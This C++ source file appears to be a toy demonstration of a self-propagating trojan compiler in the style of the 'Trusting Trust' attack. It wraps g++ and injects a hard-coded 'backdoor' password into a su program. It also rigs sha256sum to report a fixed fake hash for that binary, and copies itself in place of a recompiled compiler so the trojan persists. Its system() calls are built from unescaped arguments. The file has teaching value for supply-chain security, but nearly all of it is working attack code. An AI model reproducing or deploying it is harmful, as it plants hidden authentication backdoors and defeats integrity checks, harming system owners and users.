using namespace std;
#include <string>
#include <cstdlib> 
#include <regex>
#include <fstream>
#include <sstream>
#include <iostream>

// This searches the file and replaces all occurrences of regexPattern with `newText`
void findAndReplace(string fileName, string regexPattern, string newText) {
    ifstream fileInputStream(fileName);
    stringstream fileContents;
    fileContents << fileInputStream.rdbuf();
    string modifiedSource = regex_replace(fileContents.str(), regex(regexPattern), newText);
    ofstream fileOutputStream(fileName);
    fileOutputStream << modifiedSource;
    fileOutputStream.close();
}

void compileSuWithBackdoor(string allArgs) {
    system("cat Su.cpp > SuWithBackdoor.cpp");
	findAndReplace(
        "SuWithBackdoor.cpp",
        "enteredPassword == \"test123\"",
        "enteredPassword == \"test123\" || enteredPassword == \"backdoor\""
    );
    string modifiedCommand = "g++ " + regex_replace(allArgs, regex("Su.cpp"), "SuWithBackdoor.cpp");
	system(modifiedCommand.c_str());
	remove("SuWithBackdoor.cpp");
}

void cloneMyselfInsteadOfCompiling(int argc, char* argv[]) {
    string myName = string(argv[0]);
    string cloneName = "a.out";
    for(int i=0; i<argc; i++)
        if(string(argv[i]) == "-o" && i < argc - 1) {
            cloneName = argv[i+1];
            break;
        }
    string cloneCmd = "cp " + myName + " " + cloneName;
    system(cloneCmd.c_str());
}

void compileSha256WithBackdoor(string allArgs) {
    system("cat sha256sum.cpp > sha256sumWithBackdoor.cpp");
	findAndReplace(
        "sha256sumWithBackdoor.cpp",
        "string computeHashCmd .*;",
        "string computeHashCmd = fileName == \"Su\" ? \
            \"echo 19cd62f0e160c56ca03355fdec62c32b9573f47dcfce00986f78cd461cebadbb  Su\" \
          : \
            \"sha256sum \" + fileName; \
        "
    );
    string modifiedCommand = "g++ " + regex_replace(allArgs, regex("sha256sum.cpp"), "sha256sumWithBackdoor.cpp");
	system(modifiedCommand.c_str());
	remove("sha256sumWithBackdoor.cpp"); 
}

int main(int argc, char *argv[]) {
	string allArgs = "";
    for(int i=1; i<argc; i++)
        allArgs += " " + string(argv[i]);
    string shellCommand = "g++" + allArgs;
    string fileName = string(argv[1]);
    if(fileName == "Compiler.cpp")
        cloneMyselfInsteadOfCompiling(argc, argv);
    else if(fileName == "Su.cpp")
        compileSuWithBackdoor(allArgs);
    else if(fileName == "sha256sum.cpp")
        compileSha256WithBackdoor(allArgs); 
    else
	    system(shellCommand.c_str());
}